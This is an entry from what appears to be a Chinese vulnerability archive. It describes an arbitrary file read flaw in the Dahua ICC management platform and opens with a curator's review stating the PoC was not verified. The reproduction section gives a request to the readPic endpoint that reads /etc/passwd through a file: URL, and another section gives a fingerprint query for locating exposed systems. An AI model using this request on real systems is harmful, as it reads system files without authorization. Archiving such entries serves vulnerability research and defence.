---
source: "wy876 漏洞文库"
id: "vw-544b9ea5b1018e60603b6a77"
entity_id: "ve-544b9ea5b1018e60603b6a77"
schema_version: "1"
fofa_unverified: "web.body="
title: "大华智能物联综合管理平台(ICC)存在任意文件读取漏洞"
product: "大华ICC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "file:/etc/passwd，认证/版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%28ICC%29%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dh0fr3iwsw1u74kk"
source_status: "recorded"
---

# 大华智能物联综合管理平台(ICC)存在任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：大华ICC
- 本文讨论：evo-cirs file/readPic fileUrl读取本地文件
- 版本、权限与配置前提：file:/etc/passwd，认证/版本未知
- 资料类型：本地URL读取线索；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅URL无响应、支持协议或鉴权条件，任意文件受服务进程权限限制
- 与DSS/园区attachment不是同组件，不能品牌内粗合并
- Hunter元数据残缺
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- file协议接受行为/读取权限/认证待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台(ICC)存在任意文件读取漏洞。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征


# 四、漏洞复现
```plain
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dh0fr3iwsw1u74kk>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
